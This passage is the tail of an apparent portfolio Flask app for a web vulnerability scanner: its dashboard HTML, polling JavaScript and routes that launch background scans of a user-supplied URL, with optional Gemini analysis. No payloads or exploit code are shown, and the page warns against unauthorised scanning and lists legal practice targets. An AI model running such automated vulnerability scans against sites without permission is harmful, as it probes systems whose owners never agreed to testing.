    display: block; margin: 4px 0;
  }

  /* Status */
  #status-area { display: none; }
  .status-bar {
    background: #161b22;
    border: 1px solid #30363d;
    border-radius: 12px;
    padding: 16px 20px;
    margin-bottom: 16px;
    display: flex;
    align-items: center;
    gap: 12px;
  }
  .spinner {
    width: 18px; height: 18px;
    border: 2px solid #30363d;
    border-top-color: #58a6ff;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    flex-shrink: 0;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  .status-text { color: #8b949e; font-size: 0.9rem; }
  .status-text strong { color: #e6edf3; }

  /* Terminal */
  .terminal {
    background: #010409;
    border: 1px solid #30363d;
    border-radius: 10px;
    padding: 16px;
    height: 340px;
    overflow-y: auto;
    font-family: 'Courier New', monospace;
    font-size: 0.78rem;
    margin-bottom: 20px;
    scroll-behavior: smooth;
  }
  .log-line { padding: 1px 0; display: flex; gap: 8px; }
  .log-time { color: #444c56; flex-shrink: 0; }
  .log-INFO { color: #8b949e; }
  .log-OK   { color: #3fb950; }
  .log-VULN { color: #f85149; font-weight: bold; }
  .log-WARN { color: #d29922; }
  .log-SKIP { color: #444c56; }
  .log-HEAD { color: #58a6ff; font-weight: bold; }

  /* Results */
  #results-area { display: none; margin-top: 20px; }
  .results-header {
    background: #161b22;
    border: 1px solid #30363d;
    border-radius: 12px;
    padding: 20px 24px;
    margin-bottom: 16px;
    display: flex;
    justify-content: space-between;
    align-items: center;
  }
  .risk-badge {
    padding: 4px 14px;
    border-radius: 20px;
    font-size: 0.85rem;
    font-weight: 600;
  }
  .risk-CRITICAL { background: #f8514930; color: #f85149; border: 1px solid #f8514960; }
  .risk-HIGH     { background: #d2992230; color: #d29922; border: 1px solid #d2992260; }
  .risk-MEDIUM   { background: #388bfd20; color: #58a6ff; border: 1px solid #388bfd40; }
  .risk-LOW      { background: #3fb95020; color: #3fb950; border: 1px solid #3fb95040; }
  .vuln-grid { display: grid; gap: 10px; }
  .vuln-card {
    background: #161b22;
    border: 1px solid #f8514930;
    border-left: 3px solid #f85149;
    border-radius: 8px;
    padding: 12px 16px;
  }
  .vuln-card .vtype { color: #f85149; font-weight: 600; font-size: 0.9rem; }
  .vuln-card .vdetail { color: #8b949e; font-size: 0.82rem; margin-top: 4px; font-family: monospace; }
  .ai-section {
    background: #161b22;
    border: 1px solid #388bfd30;
    border-radius: 12px;
    padding: 20px;
    margin-top: 16px;
  }
  .ai-section h3 { color: #58a6ff; margin-bottom: 14px; }
  .ai-content { color: #e6edf3; font-size: 0.85rem; line-height: 1.7; white-space: pre-wrap; }
  .ai-content code { background: #0d1117; padding: 2px 6px; border-radius: 4px; color: #79c0ff; }
  .no-vulns {
    text-align: center; padding: 30px;
    background: #161b22; border: 1px solid #30363d;
    border-radius: 12px; color: #3fb950;
  }
  .warning-box {
    background: #5a1e0230;
    border: 1px solid #f8514940;
    border-radius: 8px;
    padding: 10px 16px;
    margin-bottom: 16px;
    color: #d29922;
    font-size: 0.82rem;
  }
  .btn-new {
    background: #21262d;
    border: 1px solid #30363d;
    color: #e6edf3;
    padding: 8px 20px;
    border-radius: 8px;
    cursor: pointer;
    font-size: 0.85rem;
    text-decoration: none;
    display: inline-block;
    margin-top: 12px;
  }
</style>
</head>
<body>

<div class="header">
  <svg width="24" height="24" viewBox="0 0 24 24" fill="#58a6ff">
    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
  </svg>
  <h1>Web Vulnerability Scanner</h1>
  <span class="badge">v2.0</span>
  <span class="badge" style="color:#3fb950;border-color:#3fb95040;background:#3fb95020">Portfolio</span>
</div>

<div class="container">

  <div class="warning-box">
    ⚠️ Only scan websites you <strong>own</strong> or have <strong>explicit written permission</strong> to test.
    Unauthorized scanning is illegal under IT Act 2000, Section 66.
  </div>

  <!-- Scan Form -->
  <div id="form-area">
    <div class="scan-card">
      <h2>🔍 Start Security Scan</h2>
      <p>Enter a target URL to scan for vulnerabilities. The scanner will crawl the site to find pages with parameters and test them automatically.</p>

      <div class="input-group">
        <label>Target URL (include https:// or http://)</label>
        <input type="text" id="target-url" placeholder="http://testphp.vulnweb.com/" value="http://testphp.vulnweb.com/">
      </div>
      <div class="input-group">
        <label>Gemini API Key (optional — for AI analysis)</label>
        <input type="text" id="gemini-key" placeholder="AIza... (get free key: aistudio.google.com)">
      </div>
      <button class="btn-scan" id="scan-btn" onclick="startScan()">🚀 Start Scan</button>

      <div class="targets">
        <p>✅ Legal practice targets (intentionally vulnerable):</p>
        <a href="#" onclick="setUrl('http://testphp.vulnweb.com/')">http://testphp.vulnweb.com/ — Acunetix test site</a>
        <a href="#" onclick="setUrl('http://demo.testfire.net/')">http://demo.testfire.net/ — IBM AltoroMutual test bank</a>
        <a href="#" onclick="setUrl('http://testphp.vulnweb.com/listproducts.php?cat=1')">http://testphp.vulnweb.com/listproducts.php?cat=1 — SQLi test page</a>
      </div>
    </div>
  </div>

  <!-- Status + Live Logs -->
  <div id="status-area">
    <div class="status-bar">
      <div class="spinner" id="spin"></div>
      <div class="status-text">
        <strong id="status-label">Scanning...</strong>
        <span id="elapsed-label"> — 0s</span>
      </div>
    </div>
    <div class="terminal" id="terminal">
      <div class="log-line"><span class="log-HEAD">Waiting for scan output...</span></div>
    </div>
  </div>

  <!-- Results -->
  <div id="results-area">
    <div class="results-header">
      <div>
        <div style="color:#8b949e;font-size:0.8rem;margin-bottom:4px">Scan Complete</div>
        <div style="font-size:1.1rem;font-weight:600" id="vuln-count-label">0 vulnerabilities</div>
        <div style="color:#8b949e;font-size:0.8rem;margin-top:2px" id="target-label"></div>
      </div>
      <div style="text-align:right">
        <div class="risk-badge" id="risk-badge">LOW</div>
        <div style="color:#8b949e;font-size:0.78rem;margin-top:6px" id="time-label"></div>
      </div>
    </div>

    <div id="vuln-list" class="vuln-grid"></div>
    <div id="ai-section" class="ai-section" style="display:none">
      <h3>🤖 Gemini AI Analysis</h3>
      <div class="ai-content" id="ai-content"></div>
    </div>

    <a href="/" class="btn-new">← Scan Another URL</a>
  </div>

</div>

<script>
let scanId = null;
let pollTimer = null;
let logCount  = 0;
let elapsedTimer = null;
let elapsedSec   = 0;

function setUrl(u) {
  document.getElementById('target-url').value = u;
  return false;
}

async function startScan() {
  const url = document.getElementById('target-url').value.trim();
  const key = document.getElementById('gemini-key').value.trim();
  if (!url) { alert('Please enter a target URL'); return; }

  document.getElementById('scan-btn').disabled = true;
  document.getElementById('scan-btn').textContent = '⏳ Scanning...';
  document.getElementById('form-area').style.display = 'none';
  document.getElementById('status-area').style.display = 'block';
  document.getElementById('terminal').innerHTML = '';
  logCount = 0; elapsedSec = 0;

  // Start elapsed timer
  elapsedTimer = setInterval(() => {
    elapsedSec++;
    document.getElementById('elapsed-label').textContent = ` — ${elapsedSec}s`;
  }, 1000);

  const fd = new FormData();
  fd.append('url', url);
  fd.append('gemini_key', key);
  const r = await fetch('/scan', {method:'POST', body: fd});
  const d = await r.json();
  scanId   = d.scan_id;

  document.getElementById('target-label').textContent = url;
  pollTimer = setInterval(pollStatus, 2000);
  pollStatus();
}

async function pollStatus() {
  if (!scanId) return;
  try {
    const r = await fetch(`/api/status/${scanId}`);
    const d = await r.json();
    updateTerminal(d.logs || []);

    if (d.status === 'done') {
      clearInterval(pollTimer);
      clearInterval(elapsedTimer);
      document.getElementById('spin').style.display = 'none';
      document.getElementById('status-label').textContent = 'Scan Complete';
      showResults(d);
    }
  } catch(e) { console.error(e); }
}

function updateTerminal(logs) {
  const term = document.getElementById('terminal');
  const newLogs = logs.slice(logCount);
  newLogs.forEach(l => {
    const div = document.createElement('div');
    div.className = 'log-line';
    div.innerHTML =
      `<span class="log-time">[${l.time}]</span>` +
      `<span class="log-${l.level}">${escHtml(l.msg)}</span>`;
    term.appendChild(div);
    logCount++;
  });
  term.scrollTop = term.scrollHeight;
}

function showResults(d) {
  document.getElementById('results-area').style.display = 'block';
  const vulns = d.vulns || [];
  const cnt   = vulns.length;
  document.getElementById('vuln-count-label').textContent =
    cnt === 0 ? '✓ No vulnerabilities found' : `${cnt} vulnerabilit${cnt===1?'y':'ies'} found`;
  document.getElementById('time-label').textContent = `Completed in ${d.elapsed}s`;

  // Risk badge
  let risk = cnt === 0 ? 'LOW' : cnt < 3 ? 'MEDIUM' : cnt < 8 ? 'HIGH' : 'CRITICAL';
  const rb  = document.getElementById('risk-badge');
  rb.textContent = risk;
  rb.className   = `risk-badge risk-${risk}`;

  // Vuln list
  const list = document.getElementById('vuln-list');
  list.innerHTML = '';
  if (cnt === 0) {
    list.innerHTML = '<div class="no-vulns">✅ No vulnerabilities detected. Site appears secure based on current tests.</div>';
  } else {
    vulns.forEach(v => {
      const card = document.createElement('div');
      card.className = 'vuln-card';
      card.innerHTML =
        `<div class="vtype">⚠ ${escHtml(v.type)}</div>` +
        `<div class="vdetail">${escHtml(v.detail)}</div>`;
      list.appendChild(card);
    });
  }

  // AI analysis
  if (d.ai_analysis) {
    document.getElementById('ai-section').style.display = 'block';
    document.getElementById('ai-content').textContent = d.ai_analysis;
  }
}

function escHtml(s) {
  return String(s)
    .replace(/&/g,'&amp;').replace(/</g,'&lt;')
    .replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}
</script>
</body>
</html>"""


# ════════════════════════════════════════════════════════════════════════════
#  FLASK ROUTES
# ════════════════════════════════════════════════════════════════════════════

@app.route("/")
def home():
    return HOME_HTML


@app.route("/scan", methods=["POST"])
def start_scan():
    url     = request.form.get("url", "").strip()
    gem_key = request.form.get("gemini_key", "").strip()

    if not url:
        return jsonify({"error": "URL is required"}), 400
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    job = ScanJob(url, gem_key)
    scans[job.id] = job

    t = threading.Thread(target=run_scan, args=(job,), daemon=True)
    t.start()

    return jsonify({"scan_id": job.id})


@app.route("/api/status/<scan_id>")
def scan_status(scan_id):
    job = scans.get(scan_id)
    if not job:
        return jsonify({"error": "Scan not found"}), 404

    return jsonify({
        "status":      job.status,
        "logs":        job.logs,
        "vulns":       job.vulns,
        "results":     job.results if job.status == "done" else {},
        "ai_analysis": job.ai_analysis,
        "elapsed":     round(time.time() - job.start, 1) if job.status == "running"
                       else job.elapsed,
    })


@app.route("/health")
def health():
    return jsonify({"status": "ok", "scans": len(scans)})


# ════════════════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"[*] Web Vulnerability Scanner starting on port {port}")
    print(f"[*] Open: http://localhost:{port}")
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)

